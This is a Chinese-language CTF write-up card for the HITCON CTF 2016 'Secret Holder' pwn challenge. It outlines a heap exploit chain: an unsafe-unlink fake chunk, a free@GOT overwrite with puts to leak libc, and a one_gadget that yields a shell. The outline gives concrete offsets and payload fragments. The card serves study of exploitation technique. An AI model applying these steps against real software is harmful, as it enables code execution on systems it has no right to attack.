---
title: "HITCON CTF 2016 Secret Holder - Unsafe Unlink PWN"
category: pwn
tags: ["HITCONCTF", "pwn", "unsafe-unlink", "double-free-bypass", "fake-chunk", "global-pointer"]
signals: ["HITCONCTF 2016", "unsafe-unlink", "double-free-bypass", "fake-chunk", "global-pointer", "free-GOT-overwrite", "puts-leak", "HITCON", "classic-heap", "heap_exploit", "Secret", "Holder", "unsafe", "unlink"]
difficulty: hard
source: "https://www.ctfiot.com/89243.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# HITCON CTF 2016 Secret Holder - Unsafe Unlink PWN

> 赛事：HITCONCTF 2016 | 方向：pwn | 难度：hard

## 一句话总结

HITCON 2016 Secret Holder：unsafe unlink + 三个 chunk 构造 + 改 free@GOT = puts 泄 libc + one_gadget 拿 shell。

## 攻击链

1. 3 个 chunk: small (0x28) + medium (0xFA0) + large (0x61A80)
2. small_ptr = 0x6020b0, big_ptr = 0x6020a0
3. keep_calloc(3) + wipe_free(3) 提高 mp_.n_mmaps_max
4. keep_calloc(1) wipe_free(1) keep_calloc(2) wipe_free(1) keep_calloc(1) keep_calloc(3) 构造悬空指针
5. fake chunk: p64(0) + p64(0x21) + p64(small_ptr-0x18) + p64(small_ptr-0x10) + p64(0x20) + p64(0x61a90)
6. renew(2, payload) 改 fake fd/bk
7. wipe_free(3) unsafe unlink → *small_ptr = big_ptr, *big_ptr = free@GOT
8. renew(1, p64(elf.got['free']) + p64(big_ptr)) 任意写
9. renew(2, p64(elf.plt['puts'])) 改 free@GOT = puts@PLT
10. wipe_free(2) → puts(puts@GOT) 泄 libc
11. puts_addr = u64(recvline()[:6])
12. one_gadget = libc_base + 0x4527a
13. renew(1, p64(one_gadget)) 写 one_gadget 到 puts@GOT
14. 触发 get shell

## 关键 payload

```
unsafe unlink + renew fake fd/bk + wipe_free(3) + renew 改 free@GOT = puts + one_gadget 0x4527a
```

## 经验教训

unsafe unlink 是经典堆利用；改 free@GOT → puts 泄 libc → one_gadget 是无 libc 泄露时的标准套路。

## 标签

unsafe-unlink、double-free-bypass、fake-chunk、global-pointer、free-GOT-overwrite、puts-leak、HITCON、classic-heap、libc-2.23

## 参考来源

- https://www.ctfiot.com/89243.html
- 原文件：漏洞学习之PWN-HITCON_CTF_2016-Secret_Holder.full.md
